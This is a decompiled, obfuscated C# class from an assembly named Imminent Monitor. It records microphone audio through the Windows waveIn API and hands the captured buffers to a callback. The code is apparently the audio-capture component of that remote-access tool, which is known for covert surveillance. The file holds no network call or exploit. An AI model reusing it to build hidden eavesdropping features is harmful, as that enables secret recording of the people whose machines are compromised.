// Decompiled with JetBrains decompiler
// Type: GClass12
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

public sealed class GClass12
{
  private GClass0 gclass0_0;
  private int int_0;
  private int int_1;
  private int int_2;
  private int int_3;
  private IntPtr intptr_0;
  private int int_4;
  private List<GClass12.Class101> list_0;
  private Delegate3 delegate3_0;
  private bool bool_0;
  private bool bool_1;
  private GDelegate0 gdelegate0_0;

  public GClass12(GClass0 gclass0_1, int int_5, int int_6, int int_7, int int_8)
  {
    this.gclass0_0 = (GClass0) null;
    this.int_0 = 8000;
    this.int_1 = 8;
    this.int_2 = 1;
    this.int_3 = 400;
    this.intptr_0 = IntPtr.Zero;
    this.int_4 = 0;
    this.list_0 = (List<GClass12.Class101>) null;
    this.delegate3_0 = (Delegate3) null;
    this.bool_0 = false;
    this.bool_1 = false;
    if (gclass0_1 == null)
      throw new ArgumentNullException("device");
    if (int_5 < 8000)
      throw new ArgumentException("Argument 'samplesPerSec' value must be >= 8000.");
    if (int_6 < 8)
      throw new ArgumentException("Argument 'bitsPerSample' value must be >= 8.");
    if (int_7 < 1)
      throw new ArgumentException("Argument 'channels' value must be >= 1.");
    this.gclass0_0 = gclass0_1;
    this.int_0 = int_5;
    this.int_1 = int_6;
    this.int_2 = int_7;
    this.int_3 = int_8;
    this.int_4 = this.int_2 * (this.int_1 / 8);
    this.list_0 = new List<GClass12.Class101>();
    Class95 class95_0 = new Class95();
    class95_0.ushort_0 = (ushort) 1;
    class95_0.ushort_1 = (ushort) this.int_2;
    class95_0.uint_0 = (uint) int_5;
    class95_0.uint_1 = (uint) (this.int_0 * this.int_2 * (this.int_1 / 8));
    class95_0.ushort_2 = (ushort) this.int_4;
    class95_0.ushort_3 = (ushort) this.int_1;
    class95_0.ushort_4 = (ushort) 0;
    this.delegate3_0 = new Delegate3(this.method_3);
    int num = Class96.waveInOpen(ref this.intptr_0, this.gclass0_0.method_2(), class95_0, this.delegate3_0, 0, 196608);
    if (num != 0)
      throw new Exception("Failed to open wav device, error: " + num.ToString() + ".");
    this.method_5();
  }

  ~GClass12() => this.method_0();

  public void method_0()
  {
    if (this.bool_1)
      return;
    this.bool_1 = true;
    try
    {
      Class96.waveInReset(this.intptr_0);
      try
      {
        foreach (GClass12.Class101 class101 in this.list_0)
        {
          Class96.waveInUnprepareHeader(this.intptr_0, class101.method_1().AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(class101.method_2()));
          class101.method_0();
        }
      }
      finally
      {
        List<GClass12.Class101>.Enumerator enumerator;
        enumerator.Dispose();
      }
      Class96.waveInClose(this.intptr_0);
      this.gclass0_0 = (GClass0) null;
      this.intptr_0 = IntPtr.Zero;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void method_1()
  {
    if (this.bool_0)
      return;
    this.bool_0 = true;
    int num = Class96.waveInStart(this.intptr_0);
    if (num != 0)
      throw new Exception("Failed to start wav device, error: " + Conversions.ToString(num) + ".");
  }

  public void method_2()
  {
    if (!this.bool_0)
      return;
    this.bool_0 = false;
    int num = Class96.waveInStop(this.intptr_0);
    if (num != 0)
      throw new Exception("Failed to stop wav device, error: " + Conversions.ToString(num) + ".");
  }

  private void method_3(IntPtr intptr_1, int int_5, int int_6, int int_7, int int_8)
  {
    try
    {
      if (int_5 != 960)
        return;
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.method_4));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_4(object object_0)
  {
    try
    {
      lock (this.list_0)
      {
        GClass12.Class101 class101 = this.list_0[0];
        this.method_15(class101.method_3());
        Class96.waveInUnprepareHeader(this.intptr_0, class101.method_1().AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(class101.method_2()));
        this.list_0.Remove(class101);
        class101.method_0();
      }
      this.method_5();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_5()
  {
    lock (this.list_0)
    {
      while (this.list_0.Count < 3)
      {
        byte[] numArray = new byte[this.int_3 - 1 + 1];
        GCHandle gchandle_3 = GCHandle.Alloc((object) numArray, GCHandleType.Pinned);
        Struct17 structure = new Struct17();
        structure.intptr_0 = gchandle_3.AddrOfPinnedObject();
        structure.uint_0 = (uint) numArray.Length;
        structure.uint_1 = 0U;
        structure.intptr_1 = IntPtr.Zero;
        structure.uint_2 = 0U;
        structure.uint_3 = 0U;
        structure.intptr_2 = IntPtr.Zero;
        structure.uint_4 = 0U;
        GCHandle gchandle_2 = GCHandle.Alloc((object) structure, GCHandleType.Pinned);
        if (Class96.waveInPrepareHeader(this.intptr_0, gchandle_2.AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(structure)) == 0)
        {
          this.list_0.Add(new GClass12.Class101(ref gchandle_2, ref gchandle_3));
          int num = Class96.waveInAddBuffer(this.intptr_0, gchandle_2.AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(structure));
          if (num != 0)
            throw new Exception("Error adding wave in buffer, error: " + Conversions.ToString(num) + ".");
        }
      }
    }
  }

  public static GClass0[] smethod_0()
  {
    List<GClass0> gclass0List = new List<GClass0>();
    int num = Class96.waveInGetNumDevs() - 1;
    for (int index = 0; index <= num; ++index)
    {
      Struct16 struct16_0 = new Struct16();
      if (Class96.waveInGetDevCaps((uint) index, ref struct16_0, Marshal.SizeOf<Struct16>(struct16_0)) == 0U)
        gclass0List.Add(new GClass0(index, struct16_0.string_0, (int) struct16_0.ushort_2));
    }
    return gclass0List.ToArray();
  }

  public bool method_6() => this.bool_1;

  public GClass0 method_7()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WavRecorder");
    return this.gclass0_0;
  }

  public int method_8()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WavRecorder");
    return this.int_0;
  }

  public int method_9()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WavRecorder");
    return this.int_1;
  }

  public int method_10()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WavRecorder");
    return this.int_2;
  }

  public int method_11()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WavRecorder");
    return this.int_3;
  }

  public int method_12()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WavRecorder");
    return this.int_4;
  }

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_13(GDelegate0 gdelegate0_1) => this.gdelegate0_0 += gdelegate0_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_14(GDelegate0 gdelegate0_1) => this.gdelegate0_0 -= gdelegate0_1;

  private void method_15(byte[] byte_0)
  {
    GDelegate0 gdelegate00 = this.gdelegate0_0;
    if (gdelegate00 == null)
      return;
    gdelegate00(byte_0);
  }

  private sealed class Class101
  {
    private GCHandle gchandle_0;
    private GCHandle gchandle_1;

    public Class101(ref GCHandle gchandle_2, ref GCHandle gchandle_3)
    {
      this.gchandle_0 = gchandle_2;
      this.gchandle_1 = gchandle_3;
    }

    public void method_0()
    {
      this.gchandle_0.Free();
      this.gchandle_1.Free();
    }

    public GCHandle method_1() => this.gchandle_0;

    public Struct17 method_2() => (Struct17) this.gchandle_0.Target;

    public byte[] method_3() => (byte[]) this.gchandle_1.Target;
  }
}
